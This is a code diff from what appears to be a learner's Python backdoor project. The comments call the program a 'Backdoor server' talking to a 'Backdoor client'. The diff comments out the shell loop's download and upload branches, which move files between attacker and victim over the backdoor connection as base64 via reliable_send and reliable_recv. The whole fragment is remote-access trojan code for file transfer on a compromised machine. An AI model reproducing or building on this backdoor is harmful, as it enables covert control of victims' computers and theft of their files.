@@ -64,39 +64,43 @@ def shell():
                 # Backdoor client does the base64 encode part 
                 # before sending the files to Backdoor server
                 # Backdoor server receives base64 decoded 
-                # before creating downloaded file                
-        elif command[:8].strip() == 'download':
-            # type(command[:8].strip()) = str
+                # before creating downloaded file 
+                
+                               
+        # elif command[:8].strip() == 'download':
+        #     # type(command[:8].strip()) = str
             
-            #with open(command[9:].strip(), 'wb') as file:
-            with open(command[9:], 'wb') as file:
-                print("Waiting for file data...")
-                result = reliable_recv()
-                print("File data received, Decoding...")
-                result_b64decode = base64.b64decode(result)
-                print("Decoding complete. Writing to file...")
-                file.write(result_b64decode)
-                print("File write complete! :D")
+        #     #with open(command[9:].strip(), 'wb') as file:
+        #     with open(command[9:], 'wb') as file:
+        #         print("Waiting for file data...")
+        #         result = reliable_recv()
+        #         print("File data received, Decoding...")
+        #         result_b64decode = base64.b64decode(result)
+        #         print("Decoding complete. Writing to file...")
+        #         file.write(result_b64decode)
+        #         print("File write complete! :D")
         
-        # 'upload' command
-            # try: Cuz some files cannot be uploaded/downloaded
-            # Read from first 7 CHAR as Binary
-            # fin = fileName
+        # # 'upload' command
+        #     # try: Cuz some files cannot be uploaded/downloaded
+        #     # Read from first 7 CHAR as Binary
+        #     # fin = fileName
             
-            # except:
-                # Avoid hanging the session when
-                # the file cannot be uploaded/downloaded
-        elif command[:6].strip() == 'upload':
-            try:
-                with open(command[7:], 'rb') as fin:
-                #with open(command[7:].strip(), 'rb') as fin:
-                    fin_read = fin.read()
-                    print(f'type(fin_read): ', type(fin_read))
-                    fin_b64encode = base64.b64encode(fin_read)
-                    reliable_send(fin_b64encode)
-            except:
-                failed = 'Failed to Upload'
-                reliable_send(base64.b64encode(failed))
+        #     # except:
+        #         # Avoid hanging the session when
+        #         # the file cannot be uploaded/downloaded
+        # elif command[:6].strip() == 'upload':
+        #     try:
+        #         with open(command[7:], 'rb') as fin:
+        #         #with open(command[7:].strip(), 'rb') as fin:
+        #             fin_read = fin.read()
+        #             print(f'type(fin_read): ', type(fin_read))
+        #             fin_b64encode = base64.b64encode(fin_read)
+        #             reliable_send(fin_b64encode)
+        #     except:
+        #         failed = 'Failed to Upload'
+        #         reliable_send(base64.b64encode(failed))
+                
+                
         else:
             # target.recv(1024bytes)
             #answer = target.recv(1024)
